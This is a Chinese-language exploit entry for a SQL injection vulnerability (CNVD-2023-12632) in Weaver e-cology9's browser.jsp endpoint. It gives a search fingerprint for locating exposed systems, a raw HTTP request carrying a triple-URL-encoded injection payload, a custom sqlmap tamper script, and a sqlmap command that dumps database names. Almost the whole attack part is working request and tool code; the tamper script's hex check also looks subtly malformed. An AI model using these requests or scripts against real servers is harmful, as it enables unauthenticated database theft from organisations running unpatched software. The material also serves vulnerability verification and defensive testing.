﻿# 泛微 E-cology9 browserjsp SQL注入漏洞

> 更新时间：2023-12-07

> 漏洞编号：CNVD-2023-12632

> 漏洞说明：泛微e-cology V9<10.56 由于e-cology OA对用户输入内容的验证存在缺陷。未经身份验证的远程攻击者通过向目标系统发送特制的字符串，最终可实现获取目标数据库中的敏感信息。

> 漏洞特征：app="泛微-协同商务系统"

> 验证脚本：HTTP

```
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded

isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37
```

> 响应代码特征：200

> 响应内容特征：show2

> 上传文件定位：

**sqlmap-tamper脚本三次url编码.py**

```python
#!/usr/bin/env python
import string
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__ = PRIORITY.LOW
 
def dependencies():
    singleTimeWarnMessage("这是一个tamper提示")
 
def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = ""
        i = 0
        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 4) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits+payload[i + 3:i + 4] in string.hexdigits+payload[i + 4:i + 5] in string.hexdigits:
                retVal += '%%25%s' % payload[i + 1:i + 5]
                i += 5
            else:
                retVal += '%%2525%.2X' % ord(payload[i])
                i += 1
    return retVal
```

**sqlmap**

```shell
python sqlmap.py -r sqlpost.txt -p keyword --dbs --tamper 三次url编码.py --batch
```

> 验证文件来源：泛微 E-cology9 browserjsp SQL注入漏洞.poc
